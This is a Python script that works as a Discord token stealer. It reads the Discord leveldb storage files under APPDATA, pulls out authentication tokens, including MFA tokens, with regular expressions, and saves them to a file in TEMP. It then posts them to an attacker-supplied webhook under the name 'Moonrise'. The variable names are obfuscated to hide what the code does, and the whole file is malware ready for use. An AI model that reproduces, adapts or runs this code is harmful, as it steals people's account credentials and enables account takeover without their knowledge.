import os
import requests
import re
r =requests.session ()
ds=('YOUR_WEBHOOK')
app=os.getenv ('APPDATA')
temp=os.getenv('TEMP')
tokendir =app +'\\\\Discord\\\\Local Storage\\\\leveldb\\\\'
dird =os.listdir (tokendir )
for file in dird :
    y =(str (tokendir )+str (file ))
def find_tokens (O0OOO00OO0O0OO00O ):
    O0OOO00OO0O0OO00O =tokendir 
    OOOO000000OO0OO00 =[]
    for OO000O00O000O0OO0 in os .listdir (O0OOO00OO0O0OO00O ):
        if not OO000O00O000O0OO0 .endswith ('.log')and not OO000O00O000O0OO0 .endswith ('.ldb'):
            continue
        for O0O0OO0OO0OO0OOOO in [OO0000O000O00O0O0 .strip ()for OO0000O000O00O0O0 in open (f'{O0OOO00OO0O0OO00O}\\{OO000O00O000O0OO0}',errors ='ignore').readlines ()if OO0000O000O00O0O0 .strip ()]:
            for O0OOO0O00OO0000OO in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
                for O0OOO00OOOOO0OOO0 in re .findall (O0OOO0O00OO0000OO ,O0O0OO0OO0OO0OOOO ):
                    OOOO000000OO0OO00 .append (O0OOO00OOOOO0OOO0 )
    return OOOO000000OO0OO00 
tokens =str (find_tokens (tokendir ))
tokens =tokens .replace ("[","")
tokens =tokens .replace ("]","")
tokens =tokens .replace ("'","")
with open(f"{temp}\\\\tokens.txt", 'w') as file:
    file.write(tokens)
data =requests .post (ds ,json ={'content':tokens ,"username":str ("Moonrise"),"avatar_url":str ("https://image.shutterstock.com/image-vector/vector-illustration-night-sky-anime-260nw-1516589039.jpg")})
